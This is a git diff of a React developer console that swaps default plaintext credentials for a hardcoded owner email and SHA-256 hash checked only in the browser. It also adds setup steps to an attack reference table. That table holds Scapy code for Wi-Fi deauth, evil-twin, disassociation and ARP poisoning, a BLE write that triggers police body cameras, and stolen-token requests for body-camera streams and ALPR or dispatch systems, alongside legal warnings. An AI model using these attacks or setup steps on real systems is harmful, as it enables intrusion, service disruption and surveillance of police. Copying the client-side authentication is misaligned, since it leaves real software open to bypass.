@@ -10,20 +10,21 @@ import DeviceFilterPanel from './DeviceFilterPanel'
 import MapView from './MapView'
 import UpdateToast from './UpdateToast'
 
-const CRED_KEY        = 'sfm_dev_creds'
 const SESSION_KEY     = 'sfm_dev_unlocked'
 const LOCKOUT_KEY     = 'sfm_dev_lockout'
-const DEFAULT_USER    = 'admin'
-const DEFAULT_PASS    = 'invincible1'
+const DEV_ACCTS_KEY   = 'inv_dev_accounts_v1'
+const DEV_OWNER_EMAIL = 'eckelbec1@gmail.com'
+const DEV_OWNER_HASH  = '447d372d63651c5dc821a257dd80b3db3c13b35d8c26dc1e370f27164fc891e1'
 const MAX_LOGIN_FAILS = 5
 const LOCKOUT_MS      = 5 * 60 * 1000   // 5 minutes
 
-function getCreds() {
-  try {
-    const stored = JSON.parse(localStorage.getItem(CRED_KEY))
-    if (stored?.username && stored?.password) return stored
-  } catch {}
-  return { username: DEFAULT_USER, password: DEFAULT_PASS }
+// Returns all authorized dev console accounts: hardcoded owner + extra accounts from localStorage
+function getDevAccounts() {
+  const extra = JSON.parse(localStorage.getItem(DEV_ACCTS_KEY) || '[]')
+  return [
+    { email: DEV_OWNER_EMAIL, hash: DEV_OWNER_HASH, name: 'Owner', owner: true },
+    ...extra,
+  ]
 }
 
 function getLockout() {
@@ -33,80 +34,16 @@ function setLockout(obj) { sessionStorage.setItem(LOCKOUT_KEY, JSON.stringify(ob
 function clearLockout()  { sessionStorage.removeItem(LOCKOUT_KEY) }
 
 // ─────────────────────────────────────────────────────────────────────────────
-// First-time setup screen (no credentials stored yet)
-// ─────────────────────────────────────────────────────────────────────────────
-function FirstTimeSetup({ onDone }) {
-  const [username, setUsername] = useState('')
-  const [password, setPassword] = useState('')
-  const [confirm,  setConfirm]  = useState('')
-  const [err,      setErr]      = useState('')
-
-  const setup = () => {
-    if (!username.trim())    { setErr('Enter a username'); return }
-    if (password.length < 6) { setErr('Password must be at least 6 characters'); return }
-    if (password !== confirm) { setErr('Passwords do not match'); return }
-    localStorage.setItem(CRED_KEY, JSON.stringify({ username: username.trim(), password }))
-    sessionStorage.setItem(SESSION_KEY, '1')
-    onDone()
-  }
-
-  const inp = {
-    width:'100%', boxSizing:'border-box',
-    background:'rgba(255,255,255,0.07)', border:'1px solid rgba(255,255,255,0.14)',
-    borderRadius:10, color:'#fff', fontFamily:'inherit', fontSize:15,
-    padding:'12px 14px', outline:'none', marginBottom:10,
-  }
-
-  return (
-    <div style={{
-      position:'fixed', inset:0, background:'#080c14',
-      display:'flex', flexDirection:'column', alignItems:'center', justifyContent:'center',
-      fontFamily:'-apple-system,BlinkMacSystemFont,system-ui,sans-serif',
-      backgroundImage:'linear-gradient(rgba(0,200,255,0.02) 1px,transparent 1px),linear-gradient(90deg,rgba(0,200,255,0.02) 1px,transparent 1px)',
-      backgroundSize:'50px 50px',
-    }}>
-      <div style={{ width:'100%', maxWidth:340, padding:'0 24px' }}>
-        <div style={{ textAlign:'center', marginBottom:32 }}>
-          <div style={{ fontSize:32, marginBottom:12 }}>🔐</div>
-          <div style={{ fontSize:11, letterSpacing:4, color:'rgba(0,200,255,0.5)', textTransform:'uppercase', marginBottom:10 }}>Invincible.Inc</div>
-          <div style={{ fontSize:22, fontWeight:800, color:'#fff', letterSpacing:-0.5, marginBottom:8 }}>Create Dev Account</div>
-          <div style={{ fontSize:12, color:'rgba(180,195,220,0.45)', lineHeight:1.6 }}>
-            First-time setup. Set your credentials to protect the dev console.
-          </div>
-        </div>
-        <input style={inp} type="text" autoComplete="username" placeholder="Username" value={username}
-          onChange={e => { setUsername(e.target.value); setErr('') }}
-          onKeyDown={e => e.key === 'Enter' && document.getElementById('fts-pass')?.focus()} />
-        <input id="fts-pass" style={inp} type="password" autoComplete="new-password" placeholder="Password (min 6 chars)" value={password}
-          onChange={e => { setPassword(e.target.value); setErr('') }}
-          onKeyDown={e => e.key === 'Enter' && document.getElementById('fts-confirm')?.focus()} />
-        <input id="fts-confirm" style={{ ...inp, marginBottom:6 }} type="password" autoComplete="new-password" placeholder="Confirm password" value={confirm}
-          onChange={e => { setConfirm(e.target.value); setErr('') }}
-          onKeyDown={e => e.key === 'Enter' && setup()} />
-        {err && <div style={{ fontSize:12, color:'#FF453A', marginBottom:10, textAlign:'center' }}>{err}</div>}
-        <button onClick={setup} style={{
-          width:'100%', padding:'13px', borderRadius:12,
-          border:'1px solid rgba(0,200,255,0.25)',
-          background:'rgba(0,200,255,0.18)', color:'#00c8ff',
-          fontSize:14, fontWeight:700, fontFamily:'inherit', cursor:'pointer',
-        }}>
-          Create Account →
-        </button>
-      </div>
-    </div>
-  )
-}
-
-// ─────────────────────────────────────────────────────────────────────────────
 // Login screen (username + password)
 // ─────────────────────────────────────────────────────────────────────────────
 function Passcode({ onUnlock }) {
-  const [username,  setUsername]  = useState('')
+  const [email,     setEmail]     = useState('')
   const [password,  setPassword]  = useState('')
   const [shake,     setShake]     = useState(false)
   const [err,       setErr]       = useState('')
   const [locked,    setLocked]    = useState(false)
   const [countdown, setCountdown] = useState(0)
+  const [signing,   setSigning]   = useState(false)
   const passRef = useRef(null)
 
   useEffect(() => {
@@ -122,10 +59,15 @@ function Passcode({ onUnlock }) {
     return () => clearInterval(t)
   }, [])
 
-  const attempt = () => {
-    if (locked) return
-    const creds = getCreds()
-    if (username === creds.username && password === creds.password) {
+  const attempt = async () => {
+    if (locked || signing) return
+    if (!email.trim() || !password) { setErr('Enter email and password'); return }
+    setSigning(true)
+    const hash = await sha256hex(password)
+    const accounts = getDevAccounts()
+    const match = accounts.find(a => a.email.toLowerCase() === email.trim().toLowerCase() && a.hash === hash)
+    setSigning(false)
+    if (match) {
       clearLockout()
       sessionStorage.setItem(SESSION_KEY, '1')
       onUnlock()
@@ -142,7 +84,7 @@ function Passcode({ onUnlock }) {
         setErr(`Invalid credentials (${MAX_LOGIN_FAILS - fails} attempts left)`)
       }
       setPassword('')
-      setTimeout(() => { setShake(false); setErr('') }, 2000)
+      setTimeout(() => { setShake(false); setErr('') }, 2500)
     }
   }
 
@@ -189,12 +131,12 @@ function Passcode({ onUnlock }) {
         <div style={{ display:'flex', flexDirection:'column', gap:10, marginBottom:16 }}>
           <input
             style={inp}
-            type="text"
-            autoComplete="username"
-            placeholder="Username"
-            value={username}
+            type="email"
+            autoComplete="email"
+            placeholder="Email"
+            value={email}
             disabled={locked}
-            onChange={e => { setUsername(e.target.value); setErr('') }}
+            onChange={e => { setEmail(e.target.value); setErr('') }}
             onKeyDown={e => { if (e.key === 'Enter') passRef.current?.focus() }}
           />
           <input
@@ -212,18 +154,18 @@ function Passcode({ onUnlock }) {
 
         <button
           onClick={attempt}
-          disabled={locked}
+          disabled={locked || signing}
           style={{
             width:'100%', padding:'13px', borderRadius:12,
             border:'1px solid rgba(0,200,255,0.25)',
-            background: locked ? 'rgba(0,200,255,0.1)' : 'rgba(0,200,255,0.18)',
-            color: locked ? 'rgba(0,200,255,0.3)' : '#00c8ff',
+            background: (locked || signing) ? 'rgba(0,200,255,0.1)' : 'rgba(0,200,255,0.18)',
+            color: (locked || signing) ? 'rgba(0,200,255,0.3)' : '#00c8ff',
             fontSize:14, fontWeight:700, fontFamily:'inherit',
-            cursor: locked ? 'not-allowed' : 'pointer',
+            cursor: (locked || signing) ? 'not-allowed' : 'pointer',
             transition:'background 0.15s',
           }}
         >
-          {locked ? `Locked (${countdown}s)` : 'Sign In'}
+          {locked ? `Locked (${countdown}s)` : signing ? '…' : 'Sign In'}
         </button>
       </div>
     </div>
@@ -1680,21 +1622,6 @@ function SecMonitorPanel() {
       })
     }
 
-    // 4. Check for known credential patterns in localStorage (warn if still default)
-    try {
-      const creds = getCreds()
-      if (creds.username === 'admin' && creds.password === 'invincible1') {
-        addEvent('warn', 'Creds', 'Default dev credentials in use — update in Settings → Security', {
-          what: 'The dev console is still protected by the factory-default username "admin" and password "invincible1". Anyone who knows the defaults can log in.',
-          remediation: [
-            'Go to Settings → Security in this Dev Console.',
-            'Enter a strong, unique username and password.',
-            'Save the new credentials — they are stored locally on this device.',
-          ],
-        })
-      }
-    } catch {}
-
     setRunning(false)
   }, [running])
 
@@ -1866,37 +1793,11 @@ function SecMonitorPanel() {
 // Security tab
 // ─────────────────────────────────────────────────────────────────────────────
 function TabSecurity() {
-  const creds = getCreds()
-  const [newUser, setNewUser] = useState('')
-  const [newPass, setNewPass] = useState('')
-  const [confirm, setConfirm] = useState('')
-  const [msg, setMsg] = useState('')
-
-  const update = () => {
-    if (!newUser.trim())      { setMsg('Username cannot be empty'); return }
-    if (newPass.length < 6)   { setMsg('Password must be at least 6 characters'); return }
-    if (newPass !== confirm)   { setMsg('Passwords do not match'); return }
-    localStorage.setItem(CRED_KEY, JSON.stringify({ username: newUser.trim(), password: newPass }))
-    setNewUser(''); setNewPass(''); setConfirm('')
-    setMsg('Credentials updated ✓')
-    setTimeout(() => setMsg(''), 3000)
-  }
-
   const lock = () => { sessionStorage.removeItem(SESSION_KEY); window.location.reload() }
 
   return (
     <div style={S.section}>
-      <div style={S.label}>Login Credentials</div>
-      <div style={S.card}>
-        <div style={{ fontSize:12, color:C.dim, marginBottom:12, lineHeight:1.6 }}>
-          Current username: <span style={{ color:C.accent, fontWeight:700 }}>{creds.username}</span>
-        </div>
-        <input style={{ ...S.input, marginBottom:8 }} type="text" autoComplete="off" placeholder="New username" value={newUser} onChange={e => setNewUser(e.target.value)} />
-        <input style={{ ...S.input, marginBottom:8 }} type="password" autoComplete="new-password" placeholder="New password (min 6 chars)" value={newPass} onChange={e => setNewPass(e.target.value)} />
-        <input style={S.input} type="password" autoComplete="new-password" placeholder="Confirm new password" value={confirm} onChange={e => setConfirm(e.target.value)} />
-        {msg && <div style={{ fontSize:12, marginTop:6, color: msg.includes('✓') ? C.green : C.red }}>{msg}</div>}
-        <button style={{ ...S.btn(C.accent), marginTop:10 }} onClick={update}>Update Credentials</button>
-      </div>
+      <DevPortalAccounts />
 
       <div style={S.label}>Session</div>
       <div style={S.card}>
@@ -1916,8 +1817,6 @@ function TabSecurity() {
       <SecMonitorPanel />
 
       <OpSecPanel />
-
-      <DevPortalAccounts />
     </div>
   )
 }
@@ -2016,15 +1915,13 @@ function OpSecPanel() {
   )
 }
 
-// ── Dev Portal Account Manager (inside Security tab) ────────────────────────
-const DEV_ACCTS_KEY       = 'inv_dev_accounts_v1'
-const DEV_OWNER_EMAIL     = 'eckelbec1@gmail.com'
-const DEV_ADMIN_HASH_CHECK = '447d372d63651c5dc821a257dd80b3db3c13b35d8c26dc1e370f27164fc891e1'
-
+// ── SHA-256 helper (Web Crypto API) ─────────────────────────────────────────
 async function sha256hex(str) {
   const buf = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(str))
   return Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2,'0')).join('')
 }
+
+// ── Dev Portal Account Manager (inside Security tab) ────────────────────────
 
 function DevPortalAccounts() {
   const [accounts, setAccounts] = useState([])
@@ -2150,7 +2047,16 @@ const DR = {
   ALMOST_CERTAIN:  { label:'ALMOST CERTAIN',color:'#FF9F0A', bg:'rgba(255,159,10,0.12)',  score:8  },
   HIGH:            { label:'HIGH',          color:'#FFD60A', bg:'rgba(255,214,10,0.12)',   score:6  },
   MODERATE:        { label:'MODERATE',      color:'#30D158', bg:'rgba(48,209,88,0.10)',    score:4  },
+  LOW:             { label:'LOW',           color:'#00c8ff', bg:'rgba(0,200,255,0.08)',    score:2  },
   NA:              { label:'N/A',           color:'rgba(180,195,220,0.4)', bg:'rgba(255,255,255,0.05)', score:0 },
+}
+
+const DAMAGE = {
+  CRITICAL:  { label:'CRITICAL',  color:'#FF453A', bg:'rgba(255,69,58,0.15)',   score:10, desc:'Permanent data destruction, systemic access, public-safety risk' },
+  HIGH:      { label:'HIGH',      color:'#FF9F0A', bg:'rgba(255,159,10,0.12)',  score:7,  desc:'Significant data exfil, service disruption, or identity exposure' },
+  MODERATE:  { label:'MODERATE',  color:'#FFD60A', bg:'rgba(255,214,10,0.12)',  score:4,  desc:'Limited data exposure, partial service impact, or reputational harm' },
+  LOW:       { label:'LOW',       color:'#30D158', bg:'rgba(48,209,88,0.10)',   score:2,  desc:'Minimal impact — informational or easily remediated' },
+  NONE:      { label:'N/A',       color:'rgba(180,195,220,0.4)', bg:'rgba(255,255,255,0.05)', score:0, desc:'Passive or research-only — no direct system impact' },
 }
 
 const LAB_REF = {
@@ -2159,17 +2065,26 @@ const LAB_REF = {
     law:'18 U.S.C. §1030 · 18 U.S.C. §1362 · FCC Part 15',
     lawColor:'#FF453A', status:'ILLEGAL',
     detectionRisk: DR.GUARANTEED,
+    damagePotential: DAMAGE.MODERATE,
     detectionNote:'Enterprise WIDS (Cisco CleanAir, Aruba RFP) detects deauth injection in <1 second. Frame appears in all nearby Wireshark captures. RF fingerprint is distinctive.',
     desc:'A deauth frame is an 802.11 management frame (subtype 0x0C) that instructs a client to disconnect from its AP. Because 802.11 management frames have no authentication, any device in monitor mode with packet injection can forge them. Broadcast addr1=FF:FF:FF:FF:FF:FF disconnects every client on the AP simultaneously.',
     code:`from scapy.all import *\npkt = RadioTap() / Dot11(\n  type=0, subtype=12,          # 12 = deauth\n  addr1="FF:FF:FF:FF:FF:FF",   # broadcast = all clients\n  addr2=bssid,                 # spoofed as AP MAC\n  addr3=bssid                  # BSSID\n) / Dot11Deauth(reason=7)      # reason 7 = class 3 not allowed\nsendp(pkt, iface="wlan0mon", count=100, inter=0.1)`,
     why:'Causes targeted denial of service to a wireless communication system. No "educational" exception. Penalty: up to 10 years under §1030(a)(5)(A) if damage is caused. Loss of connectivity = damage under the statute. FCC §333 prohibits intentional RF interference regardless of target.',
     invNet: false,
+    setup: [
+      '🛒 Buy: Alfa AWUS036ACHM (~$35) — must support monitor mode AND packet injection (most cheap adapters support monitor but not injection)',
+      '🐧 Linux only: Kali Linux or Parrot OS recommended. Windows does not support raw 802.11 injection via Scapy',
+      '🔧 Enable monitor mode: sudo airmon-ng start wlan0 → creates wlan0mon interface',
+      '🐍 Install Scapy: sudo pip install scapy',
+      '⚠️ Lab / Faraday cage ONLY — this transmits management frames visible on every 802.11 device in range. Never use outside of isolated test environments.',
+    ],
   },
   'ref-beacon': {
     icon:'📶', name:'Fake Beacon Frames / Evil Twin AP',
     law:'18 U.S.C. §1030 · §1343 · FCC §333',
     lawColor:'#FF453A', status:'ILLEGAL',
     detectionRisk: DR.ALMOST_CERTAIN,
+    damagePotential: DAMAGE.LOW,
     detectionNote:'Any device running an AP scan or enterprise WIDS sees the rogue beacon within seconds. AirMagnet, Cisco WCS, and open-source tools like Kismet all alert on duplicate SSID/BSSID. Visible to every other WiFi user in range.',
     desc:'A beacon frame (802.11 subtype 0x08) is broadcast by APs every 100ms to announce existence. Broadcasting forged beacons with a cloned SSID/BSSID creates an evil twin that devices on auto-reconnect will associate with. hostapd-wpe or bettercap captures the PMKID or full 4-way WPA2 handshake for offline cracking. Also enables captive portal serving to harvest plaintext credentials.',
     code:`from scapy.all import *\nbeacon = RadioTap() / Dot11(\n  type=0, subtype=8,\n  addr1="FF:FF:FF:FF:FF:FF",\n  addr2="AA:BB:CC:DD:EE:FF",   # fake BSSID\n  addr3="AA:BB:CC:DD:EE:FF"\n) / Dot11Beacon() / Dot11Elt(ID="SSID", info="TargetNetwork")\n  / Dot11Elt(ID="Rates", info="\\x82\\x84\\x8b\\x96")\nsendp(beacon, iface="wlan0mon", inter=0.1, loop=1)`,
@@ -2181,17 +2096,25 @@ const LAB_REF = {
     law:'18 U.S.C. §1030(a)(5)',
     lawColor:'#FF453A', status:'ILLEGAL',
     detectionRisk: DR.HIGH,
+    damagePotential: DAMAGE.MODERATE,
     detectionNote:'GATT connection attempt is logged by the device firmware with attacker adapter MAC. Officer may visually notice camera start recording unexpectedly. Axon cloud logs all camera events.',
     desc:'Axon body cameras implement a BLE GATT service (00002ab0-0000-1000-8000-00805f9b34fb) called Signal Trigger. A characteristic write to this service causes the camera to begin recording. Axon Signal Hubs use this to synchronize recording starts across multiple cameras.',
     code:`import asyncio\nfrom bleak import BleakClient\nSIGNAL_SVC  = "00002ab0-0000-1000-8000-00805f9b34fb"\nTRIGGER_CHR = "00002ab1-0000-1000-8000-00805f9b34fb"\n\nasync def trigger(addr):\n  async with BleakClient(addr) as c:\n    # write 0x01 to trigger char → starts recording\n    await c.write_gatt_char(TRIGGER_CHR, b"\\x01")`,
     why:'Our scanner reads BLE advertisements passively — zero write operations. This establishes a GATT connection and writes a command. "Causing a computer to execute unauthorized instructions" = §1030(a)(5)(A), regardless of what the instruction does. The camera is a protected computer. Penalty: up to 10 years federal.',
     invNet: false,
+    setup: [
+      '💻 Bluetooth adapter: any modern laptop or USB Bluetooth 4.0+ adapter works. Windows 10+ or Linux required',
+      '🐍 Install Python + Bleak: pip install bleak',
+      '🔍 Scan for nearby BLE devices: python -c "import asyncio; from bleak import BleakScanner; asyncio.run(BleakScanner.discover())" — Axon cameras appear as "Axon Body" or show the GATT UUID in service advertisements',
+      '⚠️ Lab only — connecting to a device you don\'t own is §1030. Use your own test camera in a Faraday cage for authorized testing only',
+    ],
   },
   'ref-ble-dos': {
     icon:'🔗', name:'Bluetooth Pairing Attacks / BLE DoS',
     law:'18 U.S.C. §1030(a)(2) · §1030(a)(5)(A)',
     lawColor:'#FF453A', status:'ILLEGAL',
     detectionRisk: DR.MODERATE,
+    damagePotential: DAMAGE.LOW,
     detectionNote:'Harder to detect than WiFi attacks. No WIDS equivalent for consumer BLE. Detection requires a dedicated BLE monitor (Ubertooth, nRF Sniffer). However, the attacker\'s Bluetooth adapter MAC is visible in any BLE advertisement scanner within range.',
     desc:'Flooding a BLE device with repeated pairing requests, connection attempts, or malformed ATT/GATT packets can cause it to hang, drain battery, drop connections, or trigger alerts. Known BLE stack vulnerabilities — BLESA (key negotiation flaw), BRAKTOOTH (crash via crafted LMP packets) — allow state machine confusion or crash. Ubertooth One or nRF52840 can inject malformed PDUs at the HCI level.',
     code:`# BRAKTOOTH-style LMP crash (DO NOT implement)\n# Requires: Ubertooth One or nRF52840 with custom firmware\n# Send malformed LMP_name_req causing OOB read in target BT stack\n\n# BLESA attack — exploit key negotiation during reconnection\n# Step 1: Force disconnect (BLESA requires device to re-pair)\n# Step 2: On reconnect, don't require re-authentication\n# Step 3: Spoof identity → bypass bonding verification`,
@@ -2203,6 +2126,7 @@ const LAB_REF = {
     law:'18 U.S.C. §2511 Federal Wiretap · Up to 5yr/intercept',
     lawColor:'#FF453A', status:'FEDERAL WIRETAP',
     detectionRisk: DR.GUARANTEED,
+    damagePotential: DAMAGE.MODERATE,
     detectionNote:'Cloud API logs every unauthorized request with IP, timestamp, and user-agent. Stolen JWT invalidation triggers security alert on Axon\'s backend within minutes. FBI/Axon corporate security partnership means law enforcement notification is standard procedure.',
     desc:'Axon Respond live-streams video from body cameras to a cloud dispatcher via RTMP/WebRTC over LTE. Stream is authenticated via Axon cloud API (JWT bearer tokens). All traffic goes through Axon\'s AWS infrastructure. No on-premise relay exists.',
     code:`# Step 1: capture JWT from authenticated session (MitM or stolen creds)\n# Step 2: enumerate live cameras\nGET https://api.axon.com/v1/devices?status=streaming\nAuthorization: Bearer <stolen_jwt>\n\n# Step 3: get RTMP stream URL\nGET https://api.axon.com/v1/streams/{camera_id}/url\n\n# Step 4: open stream\nffplay rtmp://stream.axon.com/live/{stream_key}`,
@@ -2214,17 +2138,27 @@ const LAB_REF = {
     law:'FCC Part 15/97 · 18 U.S.C. §1030',
     lawColor:'#FF9F0A', status:'FRAME INJECTION',
     detectionRisk: DR.MODERATE,
+    damagePotential: DAMAGE.NONE,
     detectionNote:'Low-rate probe injection with randomized MACs is harder to detect than beacons. Detection requires an active WIDS or someone running Wireshark locally. High-rate injection (PMKID harvesting at speed) becomes statistically obvious in any passive WiFi monitor.',
     desc:'Passive probe capture (what this app does) uses Scapy in sniff-only mode — zero frames transmitted. Active probe injection sends forged Dot11ProbeReq frames with spoofed MACs to trick APs into revealing hidden SSIDs, exposing PMKID for WPA handshake extraction, or mapping the authorized client list. PMKID attack: modern WPA2 APs include PMKID in RSN IE of probe responses — extractable without any client connecting.',
     code:`# Passive capture — WHAT WE DO (no transmission)\nsniff(iface="wlan0mon", prn=handler, store=0)\n\n# Active injection — DO NOT implement\nprobe = RadioTap() / Dot11(\n  type=0, subtype=4,         # 4 = probe request\n  addr1="FF:FF:FF:FF:FF:FF",\n  addr2=RandMAC(),           # randomized source MAC\n  addr3="FF:FF:FF:FF:FF:FF"\n) / Dot11ProbeReq() / Dot11Elt(ID="SSID", info="")\nsendp(probe, iface="wlan0mon", count=5)`,
     why:'Transmitting unauthorized 802.11 frames on a channel you don\'t own is an FCC Part 15 violation. If it causes an AP to reveal info it wouldn\'t have otherwise disclosed, that\'s unauthorized access (§1030). Passive listening = not illegal. Active transmission = illegal.',
     invNet: false,
+    setup: [
+      '🛒 Buy: Alfa AWUS036ACHM (~$35) or TP-Link TL-WN722N v1 ONLY — v2/v3 silently changed chipset and do NOT support monitor mode',
+      '💻 Windows: Download Npcap from npcap.com → run installer → check "WinPcap API-compatible Mode" (critical — without this, probe capture returns nothing)',
+      '🔌 Plug in the adapter and verify it shows in Device Manager → Network Adapters',
+      '🐍 Install Python 3 + Scapy: pip install scapy',
+      '▶️ Start the server (run_server.bat or python server.py) — it auto-configures the adapter for monitor mode on first run',
+      '✅ Open Lab → Probe Requests. Devices actively searching for WiFi appear within ~10s if any are in range',
+    ],
   },
   'ref-arp': {
     icon:'☠️', name:'ARP Poisoning / Man-in-the-Middle',
     law:'18 U.S.C. §2511 · §1030 · §1343',
     lawColor:'#FF453A', status:'ILLEGAL',
     detectionRisk: DR.HIGH,
+    damagePotential: DAMAGE.HIGH,
     detectionNote:'Managed switches log MAC address table changes. Enterprise IDS (Snort/Suricata rule 2100369) detects gratuitous ARP replies. Cisco Dynamic ARP Inspection drops poisoned packets on configured ports. XDR/EDR on endpoints may flag sudden gateway MAC change.',
     desc:'ARP (RFC 826) has no authentication. Sending unsolicited ARP replies claiming your MAC owns the gateway IP causes all LAN hosts to forward traffic through your machine. Our app\'s ARP code sends op=1 requests to discover hosts. The attack sends op=2 replies to intercept. With IP forwarding enabled, all victim traffic is transparently forwarded while being captured. Combined with SSLStrip or Responder, plaintext credentials can be harvested.',
     code:`# Passive ARP discovery — WHAT WE DO (safe)\nsend(ARP(op=1, pdst="192.168.1.0/24"))  # request, not poisoning\n\n# ARP poisoning attack — DO NOT implement\npoison = ARP(\n  op=2,                    # 2 = reply (unsolicited)\n  pdst=victim_ip,          # tell victim...\n  hwdst=victim_mac,\n  psrc=gateway_ip,         # ...that gateway is at...\n  hwsrc=attacker_mac       # ...our MAC\n)\nsend(poison, loop=1, inter=2)  # continuously refresh`,
@@ -2237,6 +2171,7 @@ const LAB_REF = {
     law:'NOT POSSIBLE — OS restriction',
     lawColor:'rgba(180,195,220,0.4)', status:'NOT POSSIBLE',
     detectionRisk: DR.NA,
+    damagePotential: DAMAGE.NONE,
     detectionNote:'Cannot be done from a browser on iOS. Zero detection surface because zero capability.',
     desc:'Apple has never shipped Web Bluetooth on iOS. Safari, Chrome for iOS, and every other iOS browser are required by Apple to use WebKit — and WebKit explicitly rejects Web Bluetooth. There is no WiFi scan API anywhere on the web platform (Chrome/Firefox/Safari on any OS). Even if these APIs existed, iOS WebViews are suspended by the OS after ~30 seconds in background, killing any scan loop.',
     code:`// Web Bluetooth (NOT available on iOS Safari)\nconst device = await navigator.bluetooth.requestDevice({...})\n// → TypeError: navigator.bluetooth is undefined on iOS\n\n// Web NFC (NOT available on iOS)\nconst reader = new NDEFReader()\n// → ReferenceError: NDEFReader is not defined\n\n// WifiManager API (experimental, Chrome Android only, not iOS)\nnavigator.mozWifiManager  // Firefox-only, discontinued`,
@@ -2248,6 +2183,7 @@ const LAB_REF = {
     law:'NOT VIABLE — driver fragmentation',
     lawColor:'#FF9F0A', status:'NOT VIABLE',
     detectionRisk: DR.NA,
+    damagePotential: DAMAGE.HIGH,
     detectionNote:'Not illegal. Detection is purely physical — someone sees the adapter. No network-level detection since it\'s just passive sniffing.',
     desc:'Alfa AWUS036ACH, TP-Link TL-WN722N v1, and similar chipsets support monitor mode and packet injection on Linux/Windows. USB OTG to Android theoretically adds monitor-mode WiFi. In practice: phone needs USB OTG power delivery, kernel needs the exact chipset driver compiled in, app needs root or a system-level service. TP-Link WN722N v2/v3 silently changed chipset and don\'t support monitor mode at all.',
     code:`# Linux kernel module approach (Android root required)\nmodprobe 88XXau         # Realtek rtl88xxau driver\nip link set wlan1 down\niw dev wlan1 set type monitor\nip link set wlan1 up\n# Then: airmon-ng check kill && airmon-ng start wlan1\n\n# Android — no standard API for this\n# Requires: rooted device + compiled kernel module\n# + exact matching chipset version + USB 3.0 OTG hub`,
@@ -2259,6 +2195,7 @@ const LAB_REF = {
     law:'18 U.S.C. §1030 · §1362 · FCC',
     lawColor:'#FF453A', status:'ILLEGAL',
     detectionRisk: DR.GUARANTEED,
+    damagePotential: DAMAGE.MODERATE,
     detectionNote:'Identical to deauth in terms of WIDS detection. MDK4 flood pattern (high-rate management frames across channels) is a named signature in every commercial WIDS. Devices in range immediately drop WiFi, which is a visible effect. RF fingerprint of the attacking adapter is logged.',
     desc:'Disassociation frames (802.11 subtype 0x0A) are similar to deauth but use a slightly different state machine transition. MDK3/MDK4 "mode d" floods both deauth and disassoc simultaneously across all channels, defeating channel-hopping countermeasures. In WPA3/802.11w-enabled networks, management frames are protected (PMF) and forged frames are dropped — but this doesn\'t change the legality.',
     code:`# Scapy disassoc (same pattern as deauth, DO NOT implement)\npkt = RadioTap() / Dot11(\n  type=0, subtype=10,      # 10 = disassoc (vs 12 = deauth)\n  addr1="FF:FF:FF:FF:FF:FF",\n  addr2=bssid, addr3=bssid\n) / Dot11Disas(reason=7)\n\n# MDK4 equivalent\nmdk4 wlan0mon d -b blacklist.txt -c 1,6,11`,
@@ -2275,6 +2212,7 @@ const LAB_REF = {
     law: '18 U.S.C. §1030(a)(2) · Stored Communications Act §2701 · State computer crime statutes',
     lawColor: '#FF453A',
     detectionRisk: DR.GUARANTEED,
+    damagePotential: DAMAGE.NONE,
     detectionNote: 'All portal logins are server-side logged with IP + timestamp. Credential theft traced within hours. Flock has a dedicated security team that monitors for abnormal "Hot List" creation. FBI is notified for ALPR network breaches — this is infrastructure targeting.',
     invNet: false,
     invNetNote: null,
@@ -2306,6 +2244,7 @@ s.post('/api/alerts/hotlist/create', json={
     law: '18 U.S.C. §1030(a)(2) · FCC Part 15 (unauthorized device access)',
     lawColor: '#FF453A',
     detectionRisk: DR.GUARANTEED,
+    damagePotential: DAMAGE.NONE,
     detectionNote: 'Cloud portals (Cradlepoint NetCloud, Sierra Wireless AirLink Management) log all logins with IP, user-agent, and geolocation. Failed login attempts trigger account lockouts and security alerts within minutes. All GPS telemetry access is logged.',
     invNet: false,
     invNetNote: null,
@@ -2334,6 +2273,7 @@ gps = r.json()   # → {"lat": 33.45, "lon": -112.07, "speed_mph": 42}
     law: 'ECPA 18 U.S.C. §2511 (encrypted) · Most states: legal to receive unencrypted P25',
     lawColor: '#FF9F0A',
     detectionRisk: DR.NA,
+    damagePotential: DAMAGE.NONE,
     detectionNote: 'Completely passive reception — no RF transmitted, no network connection. Detection surface is zero unless you are physically searched. Legal in most US states for unencrypted voice/data.',
     invNet: false,
     invNetNote: null,
@@ -2355,6 +2295,14 @@ gps = r.json()   # → {"lat": 33.45, "lon": -112.07, "speed_mph": 42}
 # Using this for operational surveillance of officers may still be
 # illegal under state laws even if reception is technically legal.`,
     why: 'Receiving unencrypted public safety radio transmissions is generally legal under federal law (and most state scanner laws) since P25 voice/data is intended to be broadcast. However: (1) using received data to actively obstruct law enforcement is a separate crime, (2) some states prohibit police scanner use while committing a crime, (3) decrypting any encrypted P25 traffic is a federal ECPA violation.',
+    setup: [
+      '🛒 Buy: RTL-SDR v3 dongle (~$30) from rtl-sdr.com or Amazon — comes with SMA antenna. Upgrade to discone or wideband whip for better range',
+      '💾 Install SDR++ (free, Windows/Linux/Mac) from sdrpp.org — auto-detects RTL-SDR on first launch',
+      '📡 Find your county P25 system at RadioReference.com → your state → your county → search for "P25" systems → note the control channel frequency',
+      '🔧 Install OP25 (GNU Radio) for GPS packet extraction: github.com/boatbod/op25 — follow Linux install instructions',
+      '🔧 Install Trunk Recorder for multi-channel trunked system support: github.com/robotastic/trunk-recorder',
+      '▶️ Configure trunk-recorder config.json with your P25 control channel frequency and run it — decoded GPS packets appear if your jurisdiction transmits unencrypted LIP data',
+    ],
   },
 
   'ref-phishing-cad': {
@@ -2364,6 +2312,7 @@ gps = r.json()   # → {"lat": 33.45, "lon": -112.07, "speed_mph": 42}
     law: 'CFAA 18 U.S.C. §1030 · CAN-SPAM · State identity theft laws',
     lawColor: '#FF453A',
     detectionRisk: DR.ALMOST_CERTAIN,
+    damagePotential: DAMAGE.CRITICAL,
     detectionNote: 'Phishing infrastructure (domains, hosting, email headers) is analyzed by enterprise email gateways. Once credentials are used from an unusual IP/device, the CAD system logs the anomaly and IT security gets alerted. Federal agencies treat police credential theft as critical infrastructure attack — response is fast and prosecution is certain.',
     invNet: false,
     invNetNote: null,
@@ -2398,6 +2347,7 @@ fleet = s.get('https://cad.city.gov/api/units/active').json()
     law: 'CFAA 18 U.S.C. §1030 · 18 U.S.C. §1030(a)(5) (damage) · State tampering',
     lawColor: '#FF453A',
     detectionRisk: DR.ALMOST_CERTAIN,
+    damagePotential: DAMAGE.HIGH,
